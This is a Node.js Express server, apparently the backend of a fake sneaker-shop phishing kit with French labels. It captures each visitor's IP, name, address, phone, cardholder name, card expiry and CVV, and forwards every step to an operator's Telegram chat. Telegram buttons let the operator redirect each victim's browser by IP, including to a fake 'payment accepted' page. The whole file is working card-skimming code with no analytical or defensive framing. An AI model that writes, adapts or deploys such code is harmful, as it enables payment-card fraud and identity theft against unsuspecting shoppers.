import express from 'express';
import path from 'path';
import bodyParser from 'body-parser';
import cors from 'cors';
import fetch from 'node-fetch';
import { fileURLToPath } from 'url';

const __filename = fileURLToPath(import.meta.url);
const __dirname = path.dirname(__filename);

const app = express();
app.use(cors());
app.use(bodyParser.json());
app.use(express.static(path.join(__dirname,'public')));

const BOT_TOKEN = process.env.BOT_TOKEN;
const CHAT_ID = process.env.CHAT_ID;
const TELEGRAM_API = BOT_TOKEN ? `https://api.telegram.org/bot${BOT_TOKEN}` : null;

if(!BOT_TOKEN || !CHAT_ID) console.warn('⚠️ BOT_TOKEN ou CHAT_ID non défini.');

const sessions = {}; // ip -> {data:{...}, redirect:null}

function getIP(req){
  let ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress || '';
  if(ip.includes(',')) ip = ip.split(',')[0];
  if(ip.includes('::ffff:')) ip = ip.split('::ffff:')[1];
  return ip;
}

async function sendTelegramNotif(data){
  if(!TELEGRAM_API || !CHAT_ID) return;
  const lines = [];
  lines.push('🆕 <b>Nouvelle interaction</b>');
  lines.push('🌐 <b>IP:</b> ' + data.ip);
  if(data.page) lines.push('📄 <b>Page:</b> ' + data.page);
  if(data.pair) lines.push('👟 <b>Paire choisie:</b> ' + data.pair);
  if(data.delivery){
    lines.push(`📦 <b>Livraison:</b> ${data.delivery.nom} ${data.delivery.prenom}`);
    lines.push(`🏠 <b>Adresse:</b> ${data.delivery.adresse}`);
    lines.push(`📞 <b>Tel:</b> ${data.delivery.telephone}`);
  }
  if(data.card){
    lines.push(`💳 <b>Carte:</b> ${data.card.panMasked}`);
    lines.push(`📝 <b>Nom titulaire:</b> ${data.card.nomTitulaire}`);
    lines.push(`📅 <b>Expiry:</b> ${data.card.expiry}`);
    lines.push(`🔒 <b>CVV:</b> ${data.card.cvv}`);
  }
  const text = lines.join('\n');

  const keyboard = {
    inline_keyboard:[
      [{text:'➡️ Accueil', callback_data:'redirect|'+data.ip+'|/' }],
      [{text:'👟 Produit', callback_data:'redirect|'+data.ip+'|/product.html'}],
      [{text:'📦 Livraison', callback_data:'redirect|'+data.ip+'|/delivery.html'}],
      [{text:'💳 Paiement', callback_data:'redirect|'+data.ip+'|/payment.html'}],
      [{text:'✅ Paiement accepté', callback_data:'redirect|'+data.ip+'|/accepted.html'}]
    ]
  };

  await fetch(`${TELEGRAM_API}/sendMessage`, {
    method:'POST',
    headers:{'Content-Type':'application/json'},
    body: JSON.stringify({chat_id: CHAT_ID, text, parse_mode:'HTML', reply_markup:keyboard})
  });
}

// Visite initiale
app.get('/api/visit', (req,res)=>{
  const ip = getIP(req);
  sessions[ip] = sessions[ip] || {data:{page:'Accueil', ip}, redirect:null};
  sendTelegramNotif(sessions[ip].data);
  res.json({ok:true, ip});
});

// Choix produit
app.post('/api/pair', (req,res)=>{
  const {pair} = req.body;
  const ip = getIP(req);
  sessions[ip] = sessions[ip] || {data:{ip}, redirect:null};
  sessions[ip].data.pair = pair;
  sessions[ip].data.page = 'Produit';
  sendTelegramNotif(sessions[ip].data);
  res.json({ok:true});
});

// Livraison
app.post('/api/delivery', (req,res)=>{
  const {nom, prenom, adresse, telephone} = req.body;
  const ip = getIP(req);
  sessions[ip] = sessions[ip] || {data:{ip}, redirect:null};
  sessions[ip].data.delivery = {nom, prenom, adresse, telephone};
  sessions[ip].data.page = 'Livraison';
  sendTelegramNotif(sessions[ip].data);
  res.json({ok:true});
});

// Paiement
app.post('/api/payment', (req,res)=>{
  const {cardNumber, expiry, cvv, nomTitulaire} = req.body;
  const ip = getIP(req);
  sessions[ip] = sessions[ip] || {data:{ip}, redirect:null};
  sessions[ip].data.card = {
    panMasked:'**** **** **** '+(cardNumber?.slice(-4)||'0000'),
    expiry, cvv, nomTitulaire
  };
  sessions[ip].data.page = 'Paiement';
  sendTelegramNotif(sessions[ip].data);
  res.json({ok:true});
});

// Status polling pour redirection
app.get('/api/status',(req,res)=>{
  const ip = getIP(req);
  res.json({redirect:sessions[ip]?.redirect || null});
});

// Webhook Telegram pour boutons
app.post('/telegramWebhook', bodyParser.json(), async (req,res)=>{
  const body = req.body;
  if(body?.callback_query){
    const cb = body.callback_query;
    const [action, ip, url] = (cb.data||'').split('|');
    if(action==='redirect' && sessions[ip]){
      sessions[ip].redirect = url;
      sessions[ip].data.page = 'Redirection admin vers '+url;
      sendTelegramNotif(sessions[ip].data);
      await fetch(`${TELEGRAM_API}/answerCallbackQuery`,{
        method:'POST', headers:{'Content-Type':'application/json'},
        body: JSON.stringify({callback_query_id:cb.id, text:'Redirection envoyée.'})
      });
    }
  }
  res.sendStatus(200);
});

// Pages
app.get('/', (req,res)=>res.sendFile(path.join(__dirname,'public','index.html')));
app.get('/product.html', (req,res)=>res.sendFile(path.join(__dirname,'public','product.html')));
app.get('/delivery.html', (req,res)=>res.sendFile(path.join(__dirname,'public','delivery.html')));
app.get('/payment.html', (req,res)=>res.sendFile(path.join(__dirname,'public','payment.html')));
app.get('/accepted.html', (req,res)=>res.sendFile(path.join(__dirname,'public','accepted.html')));

const PORT = process.env.PORT || 3000;
app.listen(PORT,()=>console.log('Server ready on', PORT));


